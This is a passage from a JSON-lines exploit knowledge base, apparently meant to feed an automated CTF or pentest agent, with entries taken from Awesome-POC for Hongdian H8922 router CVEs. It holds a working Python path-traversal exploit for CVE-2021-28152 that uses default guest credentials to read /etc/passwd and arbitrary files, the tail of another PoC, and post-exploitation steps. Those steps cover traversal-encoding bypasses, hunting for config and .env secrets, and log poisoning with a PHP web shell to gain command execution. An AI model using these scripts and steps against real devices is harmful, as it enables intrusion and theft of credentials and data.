\n        else:\n            print(\"\\033[31m[x] 请求失败 \\033[0m\")\n            sys.exit(0)\n\n    except Exception as e:\n        print(\"\\033[31m[x] 请求失败 \\033[0m\", e)\n\n\nif __name__ == '__main__':\n    title()\n    target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\"))\n    POC_1(target_url)", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2021-28151 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先 `printenv | grep -i -e flag -e ctf` —— 进程环境是最快的来源。", "再 `ls -la /` 与 `grep -rIl -e 'CTF{' -e 'flag{' /var/www /tmp /opt 2>/dev/null` —— 文件名常不含 flag。", "全空就判断提权路径（`id`/`sudo -l`/SUID），无路可上就停止并报告，不要重复同一请求。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 网络设备漏洞/宏电 H8922 后台管理员信息泄露漏洞 CVE-2021-28151.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
{"id": "awesome-poc:cve-2021-28152", "kind": "poc", "title": "宏电 H8922 后台任意文件读取漏洞 CVE-2021-28152", "technique": "path-traversal", "summary": "网络设备漏洞 / CVE-2021-28152。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2021-28152 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["网络设备漏洞", "CVE-2021-28152"], "payload_template": "import requests\nimport sys\nimport random\nimport re\nfrom lxml import etree\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\ndef title():\n    print('+------------------------------------------')\n    print('+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m')\n    print('+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m')\n    print('+  \\033[34m公众号  : PeiQi文库                                                   \\033[0m')\n    print('+  \\033[34mTitle  : 宏电 H8922 后台任意文件读取漏洞 CVE-2021-28152                 \\033[0m')\n    print('+  \\033[36m使用格式:  python3 poc.py                                            \\033[0m')\n    print('+  \\033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \\033[0m')\n    print('+------------------------------------------')\n\ndef POC_1(target_url, filename):\n    vuln_url = target_url + \"/log_download.cgi?type=../..{}\".format(filename)\n    headers = {\n            \"Content-Type\": \"application/x-www-form-urlencoded\",\n            \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\"\n    }\n    try:\n        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)\n        print(\"\\033[32m[o] 正在请求 {}/log_download.cgi?type=../../etc/passwd \\033[0m\".format(target_url))\n        if \"root\" in response.text and response.status_code == 200:\n            print(\"\\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功读取 /etc/passwd \\033[0m\".format(target_url))\n            print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text))\n            while True:\n                filename = input(\"\\033[35mFilename >>> \\033[0m\")\n                if filename == \"exit\":\n                    sys.exit(0)\n                else:\n                    POC_2(target_url, filename)\n        else:\n            print(\"\\033[31m[x] 请求失败 \\033[0m\")\n            sys.exit(0)\n    except Exception as e:\n        print(\"\\033[31m[x] 请求失败 \\033[0m\", e)\n\ndef POC_2(target_url, filename):\n    vuln_url = target_url + \"/log_download.cgi?type=../..{}\".format(filename)\n    headers = {\n        \"Content-Type\": \"application/x-www-form-urlencoded\",\n        \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\"\n    }\n    try:\n        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)\n        print(\"\\033[32m[o] {} \\033[0m\".format(response.text))\n\n    except Exception as e:\n        print(\"\\033[31m[x] 请求失败 \\033[0m\", e)\n\n\nif __name__ == '__main__':\n    title()\n    filename = '/etc/passwd'\n    target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\"))\n    POC_1(target_url, filename)", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2021-28152 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先确认读得通：`/etc/passwd` 能出内容再往下，否则换编码（`..%2f`、`..%252f`、`....//`）。", "直接冲 flag 的常见位置：`/flag`、`/flag.txt`、`/tmp/flag`、`/root/flag`、`/home/*/flag`，以及应用目录下的 `config.php`/`.env`（里面有 DB 口令，可转 SQLi 或登录后台）。", "读不到就用日志投毒转 RCE：把 `<?php system($_GET[c]);?>` 写进 `access.log`，再 `?file=/var/log/apache2/access.log&c=id`。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 网络设